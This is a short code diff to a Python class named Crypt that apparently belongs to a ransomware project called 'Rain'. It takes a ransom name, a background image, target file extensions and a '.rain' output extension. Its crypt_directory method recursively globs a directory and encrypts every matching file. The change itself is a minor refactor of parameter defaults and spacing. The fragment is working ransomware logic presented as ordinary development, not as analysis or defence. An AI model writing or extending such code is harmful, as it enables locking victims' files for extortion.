@@ -13,9 +13,9 @@ class Crypt:
     def __init__(self,
                  key: bytes,
                  extensions: list,
-                 ransom_name: str,
                  background: str,
-                 out_ext='.rain'):
+                 out_ext='.rain',
+                 ransom_name='Rain'):
         self.key = key
         self.out_ext = out_ext
         self.extensions = extensions
@@ -72,7 +72,7 @@ class Crypt:
     def crypt_directory(self, dir: str):
         # Crypt a entire directory and its sub-directorys
         for extension in self.extensions:
-            filetree = iglob(dir+'/**/*'+extension, recursive=True)
+            filetree = iglob(dir + '/**/*' + extension, recursive=True)
             for file in filetree:
                 self.crypt_file(file)
         return 0
